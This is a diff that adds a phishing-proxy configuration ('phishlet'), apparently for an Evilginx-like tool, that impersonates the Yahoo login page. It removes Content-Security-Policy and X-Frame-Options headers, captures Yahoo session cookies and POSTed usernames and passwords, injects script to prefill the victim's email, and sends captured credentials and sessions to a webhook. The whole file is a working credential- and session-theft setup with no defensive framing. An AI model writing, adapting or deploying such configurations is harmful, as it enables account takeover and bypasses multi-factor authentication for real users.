@@ -1,0 +1,53 @@
+name: 'yahoo'
+min_ver: '3.0.0'
+author: 'authflow'
+description: 'Yahoo login page'
+
+proxy_hosts:
+  - {phish_sub: 'SUB1_PLACEHOLDER', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true}
+  - {phish_sub: 'SUB1_PLACEHOLDER', orig_sub: 'login.yahoo.com', domain: 'yahoo.com', session: true}
+
+sub_filters:
+  - {trg: 'login.yahoo.com', orig: 'login.yahoo.com', repl: 'SUB1_PLACEHOLDER.{hostname}'}
+  - {trg: 'Content-Security-Policy', orig: '.*', repl: '', search: '.*', type: 'header'}
+  - {trg: 'X-Frame-Options', orig: '.*', repl: '', search: '.*', type: 'header'}
+
+auth_tokens:
+  - domain: '.yahoo.com'
+    keys: ['A3', 'A1', 'A1S', 'Y', 'T']
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'login.yahoo.com'
+  path: '/'
+
+js_inject:
+  - trigger: 'login.yahoo.com'
+    code: |
+      (function() {
+        var urlParams = new URLSearchParams(window.location.search);
+        var email = urlParams.get('email');
+        if (email) {
+          var emailField = document.querySelector('input[name="username"]');
+          if (emailField) {
+            emailField.value = email;
+            emailField.dispatchEvent(new Event('input', { bubbles: true }));
+          }
+        }
+      })()
+
+webhook:
+  url: "http://127.0.0.1:3000/api/webhook"
+  headers:
+    X-AuthFlow-Secret: "WEBHOOK_SECRET_PLACEHOLDER"
+  format: "json"
+  events: ["credentials", "session"]
